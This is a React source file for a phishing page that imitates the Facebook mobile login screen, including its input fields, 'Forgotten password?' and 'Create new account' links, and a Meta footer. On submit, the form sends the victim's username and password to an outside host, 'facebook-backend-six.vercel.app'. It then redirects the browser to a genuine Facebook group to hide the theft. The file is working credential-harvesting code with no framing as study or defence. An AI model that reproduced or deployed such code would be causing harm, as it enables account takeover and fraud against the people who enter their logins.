import { useState } from "react";
import "./App.css";

function App() {
  const [count, setCount] = useState(0);
  const [form, setform] = useState({username: "" , password: ""})

    const handleChange = (e) => {
      setform({ ...form, [e.target.name]: e.target.value });
    };
  const formSubmite = async (event) => {
     event.preventDefault()
       let r = await fetch("https://facebook-backend-six.vercel.app/", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify(form),
       });
    let res = await r.text()
    console.log(res);
    location.href = " https://www.facebook.com/groups/445724560044285";
  };
  return (
    <div className="sm:w-[550px] h-80 mx-auto py-2 w-full px-3">
      <div className="w-full h-full flex items-center flex-col">
        <div className="img">
          <img src="/text img.svg" className="w-32" alt="Error_404" />
        </div>
        <div className="">
          <form onSubmit={(event) => formSubmite(event)}>
            <input
              type="text"
              className="border border-[#acaeaf]  w-full py-2 px-3 rounded-lg mt-3 outline-none"
              placeholder="Mobile number or email address"
              value={form.username}
              onChange={handleChange}
              name="username"
              autoComplete="off"
            />
            <input
              type="password"
              className="border border-[#acaeaf] w-full py-2 px-3 rounded-lg mt-3 outline-none"
              placeholder="Password"
              value={form.password}
              onChange={(e) => handleChange(e)}
              name="password"
              autoComplete="off"
            />
            <button
              className="w-full py-2 bg-blue-600 text-white mt-3 rounded-md font-medium text-[17px]"
              type="submit"
            >
                Log in
            </button>
          </form>
        </div>
        <a
          href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0k9hIv02yCMGKs9mq&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
          className="mt-2 text-blue-600"
        >
          Forgotten password?
        </a>
        <div className="w-full h-[1px] mt-6 bg-[#ccd0d5]"></div>
        <span className="mt-[-15px] px-3 bg-white">or</span>
        <div className="btn">
          <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk">
            <button className="bg-white py-2 mt-2 w-[300px] border border-[#afafaf]">
              Create new account
            </button>
          </a>
        </div>
      </div>
      <div className="mt-40">
        <div className="w-full flex  justify-around">
          <div className="">
            <span className="block opacity-85 text-[15px] mt-1">
              English (Ul)
            </span>
            <span className="block opacity-85 text-[15px] mt-1">پښتو</span>
            <span className="block opacity-85 text-[15px] mt-1">Español</span>
          </div>
          <div className="">
            <span className="block opacity-85 text-[15px] mt-1">اردو</span>
            <span className="block opacity-85 text-[15px] mt-1">العربية</span>
            <span className="block opacity-85 text-[15px] mt-1">বাংলা</span>
          </div>
        </div>
        <footer className="text-center mt-3 text-[15px]">Meta © 2024</footer>
      </div>
    </div>
  );
}

export default App;
